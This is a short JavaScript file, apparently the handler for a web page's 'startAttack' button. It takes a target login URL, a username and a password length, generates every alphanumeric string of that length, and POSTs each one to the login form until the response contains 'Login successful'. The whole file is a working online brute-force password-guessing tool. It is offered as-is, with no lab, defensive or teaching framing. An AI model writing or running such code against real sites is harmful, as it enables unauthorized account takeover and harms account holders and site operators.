document.getElementById("startAttack").addEventListener("click", function() {
    let url = document.getElementById("url").value;
    let username = document.getElementById("username").value;
    let passLength = parseInt(document.getElementById("passLength").value);

    let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let found = false;

    async function tryPassword(attempt) {
        let formData = new URLSearchParams();
        formData.append("username", username);
        formData.append("password", attempt);

        let response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString()
        });

        let text = await response.text();
        console.log(`Trying: ${attempt}`);

        if (text.includes("Login successful")) {
            alert(`Password found: ${attempt}`);
            found = true;
        }
    }

    async function bruteForce(current) {
        if (current.length === passLength || found) {
            if (!found) await tryPassword(current);
            return;
        }

        for (let char of charset) {
            if (found) break;
            await bruteForce(current + char);
        }
    }

    bruteForce("");
});